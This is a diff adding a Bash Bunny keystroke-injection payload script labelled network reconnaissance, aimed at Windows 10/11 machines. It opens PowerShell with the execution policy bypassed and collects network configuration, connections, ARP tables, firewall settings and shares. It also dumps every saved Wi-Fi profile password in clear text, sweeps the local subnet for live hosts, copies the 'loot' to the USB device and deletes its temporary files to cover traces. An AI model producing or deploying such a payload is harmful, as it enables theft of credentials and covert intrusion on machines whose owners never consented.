@@ -1,0 +1,196 @@
+#!/bin/bash
+#
+# Title:         Network Reconnaissance
+# Description:   Network mapping and device discovery
+# Author:        Jon-Eric Pienkowski ~ Pacific NW Computers
+# Version:       1.0
+# Category:      Recon
+# Target:        Windows 10/11
+# Attackmodes:   HID, Storage, ETHERNET
+#
+# LED Status:
+# - Magenta: Setup
+# - Yellow: Scanning network
+# - Cyan: Gathering details
+# - Green: Complete
+
+LED SETUP
+
+ATTACKMODE HID STORAGE ETHERNET
+
+LOOT_DIR=/root/udisk/loot/NetRecon_$(date +%Y%m%d_%H%M%S)
+mkdir -p $LOOT_DIR
+
+# Wait for network initialization
+sleep 5
+
+# Get target network info
+GET TARGET_IP
+GET TARGET_HOSTNAME
+GET HOST_IP
+
+# Save network context
+echo "Target IP: $TARGET_IP" > $LOOT_DIR/network_context.txt
+echo "Target Hostname: $TARGET_HOSTNAME" >> $LOOT_DIR/network_context.txt
+echo "Bash Bunny IP: $HOST_IP" >> $LOOT_DIR/network_context.txt
+echo "Scan Date: $(date)" >> $LOOT_DIR/network_context.txt
+
+LED ATTACK
+
+# ============================================
+# POWERSHELL NETWORK RECON
+# ============================================
+
+RUN WIN powershell -NoProfile -ExecutionPolicy Bypass
+Q DELAY 2500
+
+# Create temp directory
+Q STRING \$l = \$env:TEMP + '\\NetRecon_' + (Get-Date -Format 'yyyyMMdd_HHmmss')
+Q ENTER
+Q DELAY 300
+
+Q STRING New-Item -ItemType Directory -Path \$l -Force \| Out-Null
+Q ENTER
+Q DELAY 500
+
+# ============================================
+# NETWORK CONFIGURATION
+# ============================================
+
+Q STRING ipconfig /all \| Out-File "\$l\\ipconfig.txt"
+Q ENTER
+Q DELAY 2000
+
+Q STRING Get-NetIPConfiguration \| Out-File "\$l\\ip_config.txt"
+Q ENTER
+Q DELAY 1500
+
+Q STRING Get-NetAdapter \| Select Name,Status,MacAddress,LinkSpeed,InterfaceDescription \| FT -A \| Out-File "\$l\\adapters.txt"
+Q ENTER
+Q DELAY 2000
+
+Q STRING Get-NetRoute \| Out-File "\$l\\routes.txt"
+Q ENTER
+Q DELAY 1500
+
+Q STRING Get-DnsClientServerAddress \| Out-File "\$l\\dns.txt"
+Q ENTER
+Q DELAY 1500
+
+# ============================================
+# ACTIVE CONNECTIONS
+# ============================================
+
+Q STRING netstat -ano \| Out-File "\$l\\connections.txt"
+Q ENTER
+Q DELAY 2000
+
+Q STRING Get-NetTCPConnection \| Select LocalAddress,LocalPort,RemoteAddress,RemotePort,State,OwningProcess \| FT -A \| Out-File "\$l\\tcp_connections.txt"
+Q ENTER
+Q DELAY 2000
+
+# ============================================
+# ARP TABLE
+# ============================================
+
+Q STRING arp -a \| Out-File "\$l\\arp_table.txt"
+Q ENTER
+Q DELAY 1500
+
+Q STRING Get-NetNeighbor \| Out-File "\$l\\neighbor_cache.txt"
+Q ENTER
+Q DELAY 1500
+
+# ============================================
+# FIREWALL STATUS
+# ============================================
+
+Q STRING Get-NetFirewallProfile \| Select Name,Enabled,DefaultInboundAction,DefaultOutboundAction \| FT -A \| Out-File "\$l\\firewall.txt"
+Q ENTER
+Q DELAY 2000
+
+Q STRING netsh advfirewall show allprofiles \| Out-File "\$l\\firewall_detailed.txt"
+Q ENTER
+Q DELAY 2000
+
+# ============================================
+# NETWORK SHARES
+# ============================================
+
+Q STRING net share \| Out-File "\$l\\shares.txt"
+Q ENTER
+Q DELAY 1000
+
+Q STRING Get-SmbShare \| Out-File "\$l\\smb_shares.txt"
+Q ENTER
+Q DELAY 1500
+
+# ============================================
+# WIFI INFORMATION
+# ============================================
+
+Q STRING netsh wlan show interfaces \| Out-File "\$l\\wifi_current.txt"
+Q ENTER
+Q DELAY 1500
+
+Q STRING netsh wlan show profiles \| Out-File "\$l\\wifi_profiles.txt"
+Q ENTER
+Q DELAY 1500
+
+Q STRING (netsh wlan show profiles) \| Select-String 'All User Profile' \| ForEach-Object {\$profile = (\$_ -split ':')[1].Trim()\; "Profile - \$profile" \| Out-File "\$l\\wifi_passwords.txt" -Append\; netsh wlan show profile name="\$profile" key=clear \| Out-File "\$l\\wifi_passwords.txt" -Append}
+Q ENTER
+Q DELAY 5000
+
+# ============================================
+# NETWORK DISCOVERY
+# ============================================
+
+LED SPECIAL
+
+Q STRING \$subnet = (Get-NetIPConfiguration \| Where-Object {(\$_.IPv4DefaultGateway -ne \$null) -and (\$_.NetAdapter.Status -eq 'Up')}).IPv4Address.IPAddress
+Q ENTER
+Q DELAY 1000
+
+Q STRING if(\$subnet){\$subnet = \$subnet.Substring(0,\$subnet.LastIndexOf('.')) + '.0/24'\; "Scanning subnet: \$subnet" \| Out-File "\$l\\network_scan.txt"}
+Q ENTER
+Q DELAY 1000
+
+Q STRING 1..254 \| ForEach-Object -Parallel {\$ip = "\$using:subnet".Replace('0/24',"\$_")\; if(Test-Connection -ComputerName \$ip -Count 1 -Quiet -TimeoutSeconds 1){\$ip}} -ThrottleLimit 50 \| Out-File "\$l\\live_hosts.txt"
+Q ENTER
+Q DELAY 30000
+
+# ============================================
+# DNS QUERIES
+# ============================================
+
+Q STRING nslookup \$env:COMPUTERNAME \| Out-File "\$l\\dns_lookup.txt"
+Q ENTER
+Q DELAY 1500
+
+# ============================================
+# COPY TO BASH BUNNY
+# ============================================
+
+LED ATTACK
+
+Q STRING \$bb = (Get-Volume \| Where-Object {(\$_.FileSystemLabel -like '*BASHBUNNY*') -or (\$_.FileSystemLabel -eq 'BB')} \| Select-Object -First 1).DriveLetter
+Q ENTER
+Q DELAY 1000
+
+Q STRING if(\$bb){Copy-Item -Path \$l -Destination "\$bb`:\\loot\\" -Recurse -Force}
+Q ENTER
+Q DELAY 5000
+
+# ============================================
+# CLEANUP
+# ============================================
+
+Q STRING Remove-Item -Path \$l -Recurse -Force -EA SilentlyContinue
+Q ENTER
+Q DELAY 1000
+
+Q STRING exit
+Q ENTER
+
+LED FINISH
+sync
